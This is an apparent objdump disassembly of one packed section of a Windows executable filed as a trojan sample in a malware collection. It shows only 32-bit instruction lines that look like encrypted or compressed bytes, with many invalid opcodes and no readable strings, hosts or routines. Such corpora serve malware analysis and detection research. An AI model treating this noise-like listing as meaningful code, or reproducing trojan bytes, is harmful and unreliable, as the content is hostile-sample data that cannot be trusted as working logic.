
malware_samples/trojan/2d02b3ac86bfc2db0e273ef22a7dada3ac24d1d33c71fe16b6f9734af02aff60.exe:     file format pei-i386


Disassembly of section g^NLx<^¿^K<:

00402000 <g^NLx<^¿^K<>:
  402000:	c4                   	(bad)
  402001:	d7                   	xlat   %ds:(%ebx)
  402002:	49                   	dec    %ecx
  402003:	38 df                	cmp    %bl,%bh
  402005:	0f a0                	push   %fs
  402007:	31 db                	xor    %ebx,%ebx
  402009:	b8 0c 11 74 73       	mov    $0x7374110c,%eax
  40200e:	6c                   	insb   (%dx),%es:(%edi)
  40200f:	10 ba 26 76 e3 6a    	adc    %bh,0x6ae37626(%edx)
  402015:	88 2d 4c 99 16 22    	mov    %ch,0x2216994c
  40201b:	cc                   	int3
  40201c:	5d                   	pop    %ebp
  40201d:	0b 99 31 8f 61 a3    	or     -0x5c9e70cf(%ecx),%ebx
  402023:	fc                   	cld
  402024:	06                   	push   %es
  402025:	46                   	inc    %esi
  402026:	c6                   	(bad)
  402027:	d9 8f 71 38 bf 1e    	(bad) 0x1ebf3871(%edi)
  40202d:	f5                   	cmc
  40202e:	2b bb ad d8 00 5b    	sub    0x5b00d8ad(%ebx),%edi
  402034:	2b 7c b0 36          	sub    0x36(%eax,%esi,4),%edi
  402038:	71 29                	jno    0x402063
  40203a:	af                   	scas   %es:(%edi),%eax
  40203b:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40203c:	b4 9a                	mov    $0x9a,%ah
  40203e:	23 24 12             	and    (%edx,%edx,1),%esp
  402041:	76 35                	jbe    0x402078
  402043:	02 69 92             	add    -0x6e(%ecx),%ch
  402046:	2f                   	das
  402047:	8d 9a c8 e5 51 c0    	lea    -0x3fae1a38(%edx),%ebx
  40204d:	15 91 e2 75 a5       	adc    $0xa575e291,%eax
  402052:	5d                   	pop    %ebp
  402053:	5b                   	pop    %ebx
  402054:	52                   	push   %edx
  402055:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  402056:	60                   	pusha
  402057:	ab                   	stos   %eax,%es:(%edi)
  402058:	44                   	inc    %esp
  402059:	47                   	inc    %edi
  40205a:	68 dc d2 ae db       	push   $0xdbaed2dc
  40205f:	eb fc                	jmp    0x40205d
  402061:	86 9a 6f df f3 9c    	xchg   %bl,-0x630c2091(%edx)
  402067:	ab                   	stos   %eax,%es:(%edi)
  402068:	42                   	inc    %edx
  402069:	5a                   	pop    %edx
  40206a:	e3 e7                	jecxz  0x402053
  40206c:	c3                   	ret
  40206d:	5e                   	pop    %esi
  40206e:	17                   	pop    %ss
  40206f:	1a f2                	sbb    %dl,%dh
  402071:	29 4a b5             	sub    %ecx,-0x4b(%edx)
  402074:	fb                   	sti
  402075:	44                   	inc    %esp
  402076:	e6 3f                	out    %al,$0x3f
  402078:	6d                   	insl   (%dx),%es:(%edi)
  402079:	c2 28 34             	ret    $0x3428
  40207c:	24 3e                	and    $0x3e,%al
  40207e:	41                   	inc    %ecx
  40207f:	f8                   	clc
  402080:	38 ae f8 3f 2f bb    	cmp    %ch,-0x44d0c008(%esi)
  402086:	ea ca b1 f0 a0 9e db 	ljmp   $0xdb9e,$0xa0f0b1ca
  40208d:	4e                   	dec    %esi
  40208e:	5c                   	pop    %esp
  40208f:	20 8e c7 12 ea 7c    	and    %cl,0x7cea12c7(%esi)
  402095:	cd 1b                	int    $0x1b
  402097:	ef                   	out    %eax,(%dx)
  402098:	56                   	push   %esi
  402099:	74 ae                	je     0x402049
  40209b:	00 eb                	add    %ch,%bl
  40209d:	d6                   	salc
  40209e:	97                   	xchg   %eax,%edi
  40209f:	25 35 49 14 a1       	and    $0xa1144935,%eax
  4020a4:	d7                   	xlat   %ds:(%ebx)
  4020a5:	3b c9                	cmp    %ecx,%ecx
  4020a7:	db 23                	(bad) (%ebx)
  4020a9:	82 ff 00             	cmp    $0x0,%bh
  4020ac:	cf                   	iret
  4020ad:	81 cd 59 55 17 0b    	or     $0xb175559,%ebp
  4020b3:	f3 14 6d             	repz adc $0x6d,%al
  4020b6:	e0 7d                	loopne 0x402135
  4020b8:	86 ea                	xchg   %ch,%dl
  4020ba:	e8 70 3d 66 4f       	call   0x4fa65e2f
  4020bf:	35 51 d6 ae 7d       	xor    $0x7daed651,%eax
  4020c4:	48                   	dec    %eax
  4020c5:	e3 7b                	jecxz  0x402142
  4020c7:	08 ca                	or     %cl,%dl
  4020c9:	18 59 dc             	sbb    %bl,-0x24(%ecx)
  4020cc:	f4                   	hlt
  4020cd:	76 a5                	jbe    0x402074
  4020cf:	a1 58 10 bc 27       	mov    0x27bc1058,%eax
  4020d4:	95                   	xchg   %eax,%ebp
  4020d5:	f5                   	cmc
  4020d6:	c8 2d 6f 9c          	enter  $0x6f2d,$0x9c
  4020da:	a2 3e 04 ff cc       	mov    %al,0xccff043e
  4020df:	63 4e 71             	arpl   %ecx,0x71(%esi)
  4020e2:	46                   	inc    %esi
  4020e3:	de f0                	fdivp  %st,%st(0)
  4020e5:	63 7c 19 3c          	arpl   %edi,0x3c(%ecx,%ebx,1)
  4020e9:	aa                   	stos   %al,%es:(%edi)
  4020ea:	e3 3e                	jecxz  0x40212a
  4020ec:	e8 a9 b0 8e 6f       	call   0x6fced19a
  4020f1:	3f                   	aas
  4020f2:	c6 38                	xabort $0x38,(bad)
  4020f4:	3b 8f b3 aa 9f 12    	cmp    0x129faab3(%edi),%ecx
  4020fa:	ae                   	scas   %es:(%edi),%al
  4020fb:	bf 51 ae 8a 8f       	mov    $0x8f8aae51,%edi
  402100:	ec                   	in     (%dx),%al
  402101:	2b 33                	sub    (%ebx),%esi
  402103:	9b                   	fwait
  402104:	f5                   	cmc
  402105:	b5 f4                	mov    $0xf4,%ch
  402107:	10 82 6b 8e 64 1f    	adc    %al,0x1f648e6b(%edx)
  40210d:	9f                   	lahf
  40210e:	60                   	pusha
  40210f:	d5 5d                	aad    $0x5d
  402111:	30 57 a6             	xor    %dl,-0x5a(%edi)
  402114:	86 96 90 4e a3 c2    	xchg   %dl,-0x3d5cb170(%esi)
  40211a:	7d 0f                	jge    0x40212b
  40211c:	41                   	inc    %ecx
  40211d:	36 e1 84             	ss loope 0x4020a4
  402120:	41                   	inc    %ecx
  402121:	88 06                	mov    %al,(%esi)
  402123:	3c 3a                	cmp    $0x3a,%al
  402125:	8e 01                	mov    (%ecx),%es
  402127:	21 0f                	and    %ecx,(%edi)
  402129:	b3 a6                	mov    $0xa6,%bl
  40212b:	0a fe                	or     %dh,%bh
  40212d:	2d 94 c5 92 48       	sub    $0x4892c594,%eax
  402132:	89 56 88             	mov    %edx,-0x78(%esi)
  402135:	99                   	cltd
  402136:	44                   	inc    %esp
  402137:	cf                   	iret
  402138:	9d                   	popf
  402139:	11 6f dd             	adc    %ebp,-0x23(%edi)
  40213c:	36 5e                	ss pop %esi
  40213e:	de f5                	fdivp  %st,%st(5)
  402140:	20 72 d6             	and    %dh,-0x2a(%edx)
  402143:	86 f1                	xchg   %dh,%cl
  402145:	21 50 47             	and    %edx,0x47(%eax)
  402148:	80 bc 41 82 cf a0 1b 	cmpb   $0x40,0x1ba0cf82(%ecx,%eax,2)
  40214f:	40 
  402150:	53                   	push   %ebx
  402151:	73 14                	jae    0x402167
  402153:	c4 84 42 d7 8b 99 cc 	les    -0x33667429(%edx,%eax,2),%eax
  40215a:	00 0b                	add    %cl,(%ebx)
  40215c:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40215d:	a1 63 cb 5c b8       	mov    0xb85ccb63,%eax
  402162:	c8 63 5a ef          	enter  $0x5a63,$0xef
  402166:	d3 4d 28             	rorl   %cl,0x28(%ebp)
  402169:	db 6b 10             	fldt   0x10(%ebx)
  40216c:	1a 76 ca             	sbb    -0x36(%esi),%dh
  40216f:	04 91                	add    $0x91,%al
  402171:	6c                   	insb   (%dx),%es:(%edi)
  402172:	7c ba                	jl     0x40212e
  402174:	5e                   	pop    %esi
  402175:	3e 00 1a             	add    %bl,%ds:(%edx)
  402178:	bb 28 2d 3b 1d       	mov    $0x1d3b2d28,%ebx
  40217d:	c3                   	ret
  40217e:	65 4f                	gs dec %edi
  402180:	63 ba 4b 3f 44 c4    	arpl   %edi,-0x3bbbc0b5(%edx)
  402186:	6a bd                	push   $0xffffffbd
  402188:	80 1b 03             	sbbb   $0x3,(%ebx)
  40218b:	40                   	inc    %eax
  40218c:	fe c5                	inc    %ch
  40218e:	c7                   	(bad)
  40218f:	7a 4c                	jp     0x4021dd
  402191:	bc 58 f0 21 30       	mov    $0x3021f058,%esp
  402196:	b2 cc                	mov    $0xcc,%dl
  402198:	d9 93 8d 29 86 cd    	fsts   -0x3279d673(%ebx)
  40219e:	e1 f6                	loope  0x402196
  4021a0:	8a e9                	mov    %cl,%ch
  4021a2:	85 a9 7a 0c 86 d2    	test   %ebp,-0x2d79f386(%ecx)
  4021a8:	2e 10 27             	adc    %ah,%cs:(%edi)
  4021ab:	4e                   	dec    %esi
  4021ac:	39 c6                	cmp    %eax,%esi
  4021ae:	88 62 84             	mov    %ah,-0x7c(%edx)
  4021b1:	76 f1                	jbe    0x4021a4
  4021b3:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4021b4:	4f                   	dec    %edi
  4021b5:	8a 45 a8             	mov    -0x58(%ebp),%al
  4021b8:	2b 41 ef             	sub    -0x11(%ecx),%eax
  4021bb:	58                   	pop    %eax
  4021bc:	6c                   	insb   (%dx),%es:(%edi)
  4021bd:	d0 4b 1c             	rorb   $1,0x1c(%ebx)
  4021c0:	26 c2 ca cf          	es ret $0xcfca
  4021c4:	45                   	inc    %ebp
  4021c5:	b4 44                	mov    $0x44,%ah
  4021c7:	c3                   	ret
  4021c8:	40                   	inc    %eax
  4021c9:	bd 41 82 10 e6       	mov    $0xe6108241,%ebp
  4021ce:	ed                   	in     (%dx),%eax
  4021cf:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4021d0:	65 e4 15             	gs in  $0x15,%al
  4021d3:	3f                   	aas
  4021d4:	3d 78 aa ae c5       	cmp    $0xc5aeaa78,%eax
  4021d9:	2f                   	das
  4021da:	12 47 36             	adc    0x36(%edi),%al
  4021dd:	7b b6                	jnp    0x402195
  4021df:	d8 c2                	fadd   %st(2),%st
  4021e1:	29 fe                	sub    %edi,%esi
  4021e3:	19 6c cb 50          	sbb    %ebp,0x50(%ebx,%ecx,8)
  4021e7:	17                   	pop    %ss
  4021e8:	67 02 68 2b          	add    0x2b(%bx,%si),%ch
  4021ec:	43                   	inc    %ebx
  4021ed:	b4 63                	mov    $0x63,%ah
  4021ef:	b9 29 5b ce 85       	mov    $0x85ce5b29,%ecx
  4021f4:	50                   	push   %eax
  4021f5:	1e                   	push   %ds
  4021f6:	fe                   	(bad)
  4021f7:	19 bb 61 bc be 91    	sbb    %edi,-0x6e41439f(%ebx)
  4021fd:	f8                   	clc
  4021fe:	06                   	push   %es
  4021ff:	50                   	push   %eax
  402200:	2c ee                	sub    $0xee,%al
  402202:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  402203:	4c                   	dec    %esp
  402204:	2e 8b d3             	cs mov %ebx,%edx
  402207:	38 c0                	cmp    %al,%al
  402209:	1b 03                	sbb    (%ebx),%eax
  40220b:	40                   	inc    %eax
  40220c:	38 0a                	cmp    %cl,(%edx)
  40220e:	24 f9                	and    $0xf9,%al
  402210:	7e 0c                	jle    0x40221e
  402212:	d0 59 41             	rcrb   $1,0x41(%ecx)
  402215:	d3 70 ec             	shll   %cl,-0x14(%eax)
  402218:	de 5d de             	ficomps -0x22(%ebp)
  40221b:	81 49 cc 67 16 db 5b 	orl    $0x5bdb1667,-0x34(%ecx)
  402222:	a2 3d dc e9 61       	mov    %al,0x61e9dc3d
  402227:	0c 93                	or     $0x93,%al
  402229:	2c 24                	sub    $0x24,%al
  40222b:	6f                   	outsl  %ds:(%esi),(%dx)
  40222c:	4d                   	dec    %ebp
  40222d:	d9 0f                	(bad) (%edi)
  40222f:	f1                   	int1
  402230:	53                   	push   %ebx
  402231:	87 e3                	xchg   %esp,%ebx
  402233:	ac                   	lods   %ds:(%esi),%al
  402234:	75 46                	jne    0x40227c
  402236:	b9 51 fe 89 77       	mov    $0x7789fe51,%ecx
  40223b:	fc                   	cld
  40223c:	b9 10 c5 8d 8e       	mov    $0x8e8dc510,%ecx
  402241:	12 61 8a             	adc    -0x76(%ecx),%ah
  402244:	44                   	inc    %esp
  402245:	b3 8e                	mov    $0x8e,%bl
  402247:	67 c6                	addr16 (bad)
  402249:	63 b4 62 71 bf c2 36 	arpl   %esi,0x36c2bf71(%edx,%eiz,2)
  402250:	97                   	xchg   %eax,%edi
  402251:	35 ae 47 58 fb       	xor    $0xfb5847ae,%eax
  402256:	2b 2e                	sub    (%esi),%ebp
  402258:	df 92 99 bf 68 ff    	fists  -0x974067(%edx)
  40225e:	02 a4 81 47 45 5b 8f 	add    -0x70a4bab9(%ecx,%eax,4),%ah
  402265:	9c                   	pushf
  402266:	b9 19 cd 71 cc       	mov    $0xcc71cd19,%ecx
  40226b:	a0 79 22 95 6b       	mov    0x6b952279,%al
  402270:	4f                   	dec    %edi
  402271:	af                   	scas   %es:(%edi),%eax
  402272:	9e                   	sahf
  402273:	ea e9 6c 74 8f e3 b3 	ljmp   $0xb3e3,$0x8f746ce9
  40227a:	32 3a                	xor    (%edx),%bh
  40227c:	86 3a                	xchg   %bh,(%edx)
  40227e:	80 cb f7             	or     $0xf7,%bl
  402281:	3a 1c c8             	cmp    (%eax,%ecx,8),%bl
  402284:	c0 da 49             	rcr    $0x49,%dl
  402287:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  402288:	38 88 6f a0 89 e4    	cmp    %cl,-0x1b765f91(%eax)
  40228e:	7d 74                	jge    0x402304
  402290:	ce                   	into
  402291:	5e                   	pop    %esi
  402292:	69 85 b9 20 e7 6b cf 	imul   $0xfd54bacf,0x6be720b9(%ebp),%eax
  402299:	ba 54 fd 
  40229c:	5f                   	pop    %edi
  40229d:	27                   	daa
  40229e:	be e1 a8 6d 00       	mov    $0x6da8e1,%esi
  4022a3:	99                   	cltd
  4022a4:	7c c6                	jl     0x40226c
  4022a6:	74 57                	je     0x4022ff
  4022a8:	c8 98 87 de          	enter  $0x8798,$0xde
  4022ac:	73 48                	jae    0x4022f6
  4022ae:	50                   	push   %eax
  4022af:	a9 eb d6 59 28       	test   $0x2859d6eb,%eax
  4022b4:	8c 95 2f cd 42 da    	mov    %ss,-0x25bd32d1(%ebp)
  4022ba:	ed                   	in     (%dx),%eax
  4022bb:	77 c3                	ja     0x402280
  4022bd:	61                   	popa
  4022be:	3b 09                	cmp    (%ecx),%ecx
  4022c0:	d3 61 d7             	shll   %cl,-0x29(%ecx)
  4022c3:	05 c6 00 05 e3       	add    $0xe30500c6,%eax
  4022c8:	18 b3 2a de fc f3    	sbb    %dh,-0xc0321d6(%ebx)
  4022ce:	c6                   	(bad)
  4022cf:	4d                   	dec    %ebp
  4022d0:	70 85                	jo     0x402257
  4022d2:	24 c3                	and    $0xc3,%al
  4022d4:	d7                   	xlat   %ds:(%ebx)
  4022d5:	48                   	dec    %eax
  4022d6:	a2 a9 15 e2 0f       	mov    %al,0xfe215a9
  4022db:	3b 65 4f             	cmp    0x4f(%ebp),%esp
  4022de:	79 1f                	jns    0x4022ff
  4022e0:	c7                   	(bad)
  4022e1:	91                   	xchg   %eax,%ecx
  4022e2:	bb d6 fa ee 2f       	mov    $0x2feefad6,%ebx
  4022e7:	95                   	xchg   %eax,%ebp
  4022e8:	46                   	inc    %esi
  4022e9:	c0 42 1c c5          	rolb   $0xc5,0x1c(%edx)
  4022ed:	71 0b                	jno    0x4022fa
  4022ef:	e7 c0                	out    %eax,$0xc0
  4022f1:	ff 14 66             	call   *(%esi,%eiz,2)
  4022f4:	fa                   	cli
  4022f5:	bc ea 0a 8f 03       	mov    $0x38f0aea,%esp
  4022fa:	a9 b5 75 8b f6       	test   $0xf68b75b5,%eax
  4022ff:	46                   	inc    %esi
  402300:	d4 88                	aam    $0x88
  402302:	96                   	xchg   %eax,%esi
  402303:	43                   	inc    %ebx
  402304:	df 20                	fbld   (%eax)
  402306:	d1 28                	shrl   $1,(%eax)
  402308:	38 45 f4             	cmp    %al,-0xc(%ebp)
  40230b:	17                   	pop    %ss
  40230c:	35 7e eb 46 ad       	xor    $0xad46eb7e,%eax
  402311:	f7 ff                	idiv   %edi
  402313:	50                   	push   %eax
  402314:	18 b2 23 86 16 4c    	sbb    %dh,0x4c168623(%edx)
  40231a:	34 87                	xor    $0x87,%al
  40231c:	81 66 3c 42 f0 96 7e 	andl   $0x7e96f042,0x3c(%esi)
  402323:	34 8a                	xor    $0x8a,%al
  402325:	e4 61                	in     $0x61,%al
  402327:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  402328:	7a c3                	jp     0x4022ed
  40232a:	fb                   	sti
  40232b:	79 9d                	jns    0x4022ca
  40232d:	ef                   	out    %eax,(%dx)
  40232e:	d2 45 fc             	rolb   %cl,-0x4(%ebp)
  402331:	01 e8                	add    %ebp,%eax
  402333:	8f                   	(bad)
  402334:	ec                   	in     (%dx),%al
  402335:	1a 5a 59             	sbb    0x59(%edx),%bl
  402338:	a1 3c 3c e0 87       	mov    0x87e03c3c,%eax
  40233d:	a2 bd a4 c4 80       	mov    %al,0x80c4a4bd
  402342:	1d 14 a2 68 ca       	sbb    $0xca68a214,%eax
  402347:	b7 cd                	mov    $0xcd,%bh
  402349:	71 ce                	jno    0x402319
  40234b:	6d                   	insl   (%dx),%es:(%edi)
  40234c:	5d                   	pop    %ebp
  40234d:	59                   	pop    %ecx
  40234e:	59                   	pop    %ecx
  40234f:	7b d7                	jnp    0x402328
  402351:	19 ac 9f 37 cd 4b cb 	sbb    %ebp,-0x34b432c9(%edi,%ebx,4)
  402358:	38 e1                	cmp    %ah,%cl
  40235a:	8e 5a 8b             	mov    -0x75(%edx),%ds
  40235d:	82 d7 d5             	adc    $0xd5,%bh
  402360:	d2 db                	rcr    %cl,%bl
  402362:	e9 28 83 d0 d7       	jmp    0xd810a68f
  402367:	63 7d 8a             	arpl   %edi,-0x76(%ebp)
  40236a:	8e 43 48             	mov    0x48(%ebx),%es
  40236d:	e8 71 92 13 31       	call   0x3153b5e3
  402372:	b2 cb                	mov    $0xcb,%dl
  402374:	1e                   	push   %ds
  402375:	d6                   	salc
  402376:	1d 8c 2f 05 69       	sbb    $0x69052f8c,%eax
  40237b:	0c ac                	or     $0xac,%al
  40237d:	ea 82 29 2c 73 82 71 	ljmp   $0x7182,$0x732c2982
  402384:	a8 7d                	test   $0x7d,%al
  402386:	6c                   	insb   (%dx),%es:(%edi)
  402387:	6c                   	insb   (%dx),%es:(%edi)
  402388:	87 a1 5c 55 89 7e    	xchg   %esp,0x7e89555c(%ecx)
  40238e:	05 b1 e7 19 74       	add    $0x7419e7b1,%eax
  402393:	d5 41                	aad    $0x41
  402395:	f9                   	stc
  402396:	26 06                	es push %es
  402398:	ac                   	lods   %ds:(%esi),%al
  402399:	c8 af c2 84          	enter  $0xc2af,$0x84
  40239d:	9b                   	fwait
  40239e:	3b ae ea 62 9d da    	cmp    -0x25629d16(%esi),%ebp
  4023a4:	62 07                	bound  %eax,(%edi)
  4023a6:	6d                   	insl   (%dx),%es:(%edi)
  4023a7:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4023a8:	8c e8                	mov    %gs,%eax
  4023aa:	c4 9b 61 10 2c c3    	les    -0x3cd3ef9f(%ebx),%ebx
  4023b0:	2b 48 61             	sub    0x61(%eax),%ecx
  4023b3:	29 86 9a 01 11 12    	sub    %eax,0x1211019a(%esi)
  4023b9:	0d 74 6e aa 07       	or     $0x7aa6e74,%eax
  4023be:	5f                   	pop    %edi
  4023bf:	5f                   	pop    %edi
  4023c0:	da 65 c2             	fisubl -0x3e(%ebp)
  4023c3:	50                   	push   %eax
  4023c4:	d0 ac 38 ba 8f c1 37 	shrb   $1,0x37c18fba(%eax,%edi,1)
  4023cb:	f3 2d ad 97 cb 2b    	repz sub $0x2bcb97ad,%eax
  4023d1:	44                   	inc    %esp
  4023d2:	0f 86 b9 44 ec 66    	jbe    0x672c6891
  4023d8:	e3 c8                	jecxz  0x4023a2
  4023da:	ef                   	out    %eax,(%dx)
  4023db:	fe                   	(bad)
  4023dc:	62 3c e7             	bound  %edi,(%edi,%eiz,8)
  4023df:	ed                   	in     (%dx),%eax
  4023e0:	15 9a 5e 0e ee       	adc    $0xee0e5e9a,%eax
  4023e5:	27                   	daa
  4023e6:	3e 70 c4             	jo,pt  0x4023ad
  4023e9:	8e 91 d5 5a 95 13    	mov    0x13955ad5(%ecx),%ss
  4023ef:	c5 62 2a             	lds    0x2a(%edx),%esp
  4023f2:	3c 63                	cmp    $0x63,%al
  4023f4:	33 95 43 2f 13 53    	xor    0x53132f43(%ebp),%edx
  4023fa:	d1 53 3c             	rcll   $1,0x3c(%ebx)
  4023fd:	3e 1c 82             	ds sbb $0x82,%al
  402400:	f9                   	stc
  402401:	9c                   	pushf
  402402:	7b 91                	jnp    0x402395
  402404:	e3 41                	jecxz  0x402447
  402406:	fb                   	sti
  402407:	e8 a2 7c 93 ae       	call   0xaed3a0ae
  40240c:	57                   	push   %edi
  40240d:	d3 4d 02             	rorl   %cl,0x2(%ebp)
  402410:	55                   	push   %ebp
  402411:	6a d5                	push   $0xffffffd5
  402413:	c8 47 64 b8          	enter  $0x6447,$0xb8
  402417:	af                   	scas   %es:(%edi),%eax
  402418:	69 91 34 2d 77 44 e5 	imul   $0xd59726e5,0x44772d34(%ecx),%edx
  40241f:	26 97 d5 
  402422:	43                   	inc    %ebx
  402423:	6c                   	insb   (%dx),%es:(%edi)
  402424:	ea 52 e7 83 bc 8e 79 	ljmp   $0x798e,$0xbc83e752
  40242b:	ed                   	in     (%dx),%eax
  40242c:	8c 42 df             	mov    %es,-0x21(%edx)
  40242f:	06                   	push   %es
  402430:	11 54 99 8f          	adc    %edx,-0x71(%ecx,%ebx,4)
  402434:	44                   	inc    %esp
  402435:	9d                   	popf
  402436:	09 44 d4 26          	or     %eax,0x26(%esp,%edx,8)
  40243a:	a9 ba 53 46 97       	test   $0x974653ba,%eax
  40243f:	da af a8 13 e9 c4    	fisubrl -0x3b16ec58(%edi)
  402445:	73 48                	jae    0x40248f
  402447:	d9 44 b2 5d          	flds   0x5d(%edx,%esi,4)
  40244b:	e6 61                	out    %al,$0x61
  40244d:	f7 28                	imull  (%eax)
  40244f:	c0 df 54             	rcr    $0x54,%bh
  402452:	61                   	popa
  402453:	5c                   	pop    %esp
  402454:	40                   	inc    %eax
  402455:	fb                   	sti
  402456:	43                   	inc    %ebx
  402457:	b3 da                	mov    $0xda,%bl
  402459:	d8 d7                	fcom   %st(7)
  40245b:	6e                   	outsb  %ds:(%esi),(%dx)
  40245c:	6e                   	outsb  %ds:(%esi),(%dx)
  40245d:	93                   	xchg   %eax,%ebx
  40245e:	5f                   	pop    %edi
  40245f:	7b a0                	jnp    0x402401
  402461:	70 e3                	jo     0x402446
  402463:	a9 03 7a ae e1       	test   $0xe1ae7a03,%eax
  402468:	35 d3 84 a9 a8       	xor    $0xa8a984d3,%eax
  40246d:	7c 89                	jl     0x4023f8
  40246f:	4c                   	dec    %esp
  402470:	3b 70 74             	cmp    0x74(%eax),%esi
  402473:	46                   	inc    %esi
  402474:	b1 33                	mov    $0x33,%cl
  402476:	5d                   	pop    %ebp
  402477:	db cd                	fcmovne %st(5),%st
  402479:	09 9b 58 e6 0f 6a    	or     %ebx,0x6a0fe658(%ebx)
  40247f:	f8                   	clc
  402480:	35 2f 31 37 d7       	xor    $0xd737312f,%eax
  402485:	84 13                	test   %dl,(%ebx)
  402487:	38 55 fa             	cmp    %dl,-0x6(%ebp)
  40248a:	ea c7 d3 07 c1 d6 fe 	ljmp   $0xfed6,$0xc107d3c7
  402491:	5c                   	pop    %esp
  402492:	6e                   	outsb  %ds:(%esi),(%dx)
  402493:	9d                   	popf
  402494:	2d 03 da d6 cb       	sub    $0xcbd6da03,%eax
  402499:	c6                   	(bad)
  40249a:	6e                   	outsb  %ds:(%esi),(%dx)
  40249b:	53                   	push   %ebx
  40249c:	78 b3                	js     0x402451
  40249e:	0b b3 36 85 9e e7    	or     -0x18617aca(%ebx),%esi
  4024a4:	1d 87 22 0e 45       	sbb    $0x450e2287,%eax
  4024a9:	9a 6b f6 cd 84 2b cb 	lcall  $0xcb2b,$0x84cdf66b
  4024b0:	9d                   	popf
  4024b1:	be 75 a4 23 de       	mov    $0xde23a475,%esi
  4024b6:	e5 b9                	in     $0xb9,%eax
  4024b8:	87 09                	xchg   %ecx,(%ecx)
  4024ba:	f3 6b 00 c8          	repz imul $0xffffffc8,(%eax),%eax
  4024be:	34 30                	xor    $0x30,%al
  4024c0:	5f                   	pop    %edi
  4024c1:	5e                   	pop    %esi
  4024c2:	eb 65                	jmp    0x402529
  4024c4:	f4                   	hlt
  4024c5:	bd c7 2d fb bc       	mov    $0xbcfb2dc7,%ebp
  4024ca:	86 07                	xchg   %al,(%edi)
  4024cc:	f9                   	stc
  4024cd:	c9                   	leave
  4024ce:	6d                   	insl   (%dx),%es:(%edi)
  4024cf:	2c 98                	sub    $0x98,%al
  4024d1:	78 d6                	js     0x4024a9
  4024d3:	24 57                	and    $0x57,%al
  4024d5:	2c 84                	sub    $0x84,%al
  4024d7:	11 c1                	adc    %eax,%ecx
  4024d9:	f9                   	stc
  4024da:	71 82                	jno    0x40245e
  4024dc:	94                   	xchg   %eax,%esp
  4024dd:	ca cd 22             	lret   $0x22cd
  4024e0:	d3 bc 55 05 e4 3d e9 	sarl   %cl,-0x16c21bfb(%ebp,%edx,2)
  4024e7:	e1 04                	loope  0x4024ed
  4024e9:	e2 81                	loop   0x40246c
  4024eb:	19 db                	sbb    %ebx,%ebx
  4024ed:	b1 87                	mov    $0x87,%cl
  4024ef:	30 d9                	xor    %bl,%cl
  4024f1:	1b cf                	sbb    %edi,%ecx
  4024f3:	1d 2d 00 b9 e6       	sbb    $0xe6b9002d,%eax
  4024f8:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4024f9:	29 3b                	sub    %edi,(%ebx)
  4024fb:	a1 01 65 8e f3       	mov    0xf38e6501,%eax
  402500:	69 80 bf b2 0b ff 17 	imul   $0x700d6317,-0xf44d41(%eax),%eax
  402507:	63 0d 70 
  40250a:	20 db                	and    %bl,%bl
  40250c:	03 fe                	add    %esi,%edi
  40250e:	08 6d c9             	or     %ch,-0x37(%ebp)
  402511:	22 94 38 50 07 1d 04 	and    0x41d0750(%eax,%edi,1),%dl
  402518:	65 40                	gs inc %eax
  40251a:	15 84 50 0d 77       	adc    $0x770d5084,%eax
  40251f:	71 e0                	jno    0x402501
  402521:	c4                   	(bad)
  402522:	cb                   	lret
  402523:	10 d8                	adc    %bl,%al
  402525:	ee                   	out    %al,(%dx)
  402526:	fe                   	(bad)
  402527:	3f                   	aas
  402528:	4f                   	dec    %edi
  402529:	33 9d f2 95 e1 73    	xor    0x73e195f2(%ebp),%ebx
  40252f:	93                   	xchg   %eax,%ebx
  402530:	0d bc 9b 5d 59       	or     $0x595d9bbc,%eax
  402535:	24 65                	and    $0x65,%al
  402537:	22 a0 5d 63 d6 05    	and    0x5d6635d(%eax),%ah
  40253d:	81 dc 50 1c b9 76    	sbb    $0x76b91c50,%esp
  402543:	d0 5d 3d             	rcrb   $1,0x3d(%ebp)
  402546:	33 6e 7c             	xor    0x7c(%esi),%ebp
  402549:	b8 ea 76 c9 4e       	mov    $0x4ec976ea,%eax
  40254e:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40254f:	92                   	xchg   %eax,%edx
  402550:	ed                   	in     (%dx),%eax
  402551:	b7 b0                	mov    $0xb0,%bh
  402553:	89 78 23             	mov    %edi,0x23(%eax)
  402556:	f8                   	clc
  402557:	b8 4e 99 4f 9b       	mov    $0x9b4f994e,%eax
  40255c:	49                   	dec    %ecx
  40255d:	9a ee 4d 74 8d be b2 	lcall  $0xb2be,$0x8d744dee
  402564:	0d e9 45 6c 6f       	or     $0x6f6c45e9,%eax
  402569:	4a                   	dec    %edx
  40256a:	5d                   	pop    %ebp
  40256b:	15 b9 51 3c d4       	adc    $0xd43c51b9,%eax
  402570:	37                   	aaa
  402571:	ef                   	out    %eax,(%dx)
  402572:	48                   	dec    %eax
  402573:	ff a0 d0 31 67 a8    	jmp    *-0x5798ce30(%eax)
  402579:	80 3b 03             	cmpb   $0x3,(%ebx)
  40257c:	46                   	inc    %esi
  40257d:	ba 92 9f 3e fe       	mov    $0xfe3e9f92,%edx
  402582:	21 6a a4             	and    %ebp,-0x5c(%edx)
  402585:	f9                   	stc
  402586:	ff ac 84 e5 80 a3 ba 	ljmp   *-0x455c7f1b(%esp,%eax,4)
  40258d:	65 65 c1 0d ff 73 a3 	gs rorl $0xd7,%gs:0x43a373ff
  402594:	43 d7 
  402596:	a2 fa 47 b2 83       	mov    %al,0x83b247fa
  40259b:	98                   	cwtl
  40259c:	e4 98                	in     $0x98,%al
  40259e:	89 dc                	mov    %ebx,%esp
  4025a0:	28 b5 2e 91 1e ab    	sub    %dh,-0x54e16ed2(%ebp)
  4025a6:	fd                   	std
  4025a7:	55                   	push   %ebp
  4025a8:	77 63                	ja     0x40260d
  4025aa:	1c 4c                	sbb    $0x4c,%al
  4025ac:	c2 21 e4             	ret    $0xe421
  4025af:	15 41 1b 24 1b       	adc    $0x1b241b41,%eax
  4025b4:	04 7c                	add    $0x7c,%al
  4025b6:	46                   	inc    %esi
  4025b7:	fe                   	(bad)
  4025b8:	e1 1a                	loope  0x4025d4
  4025ba:	46                   	inc    %esi
  4025bb:	18 f2                	sbb    %dh,%dl
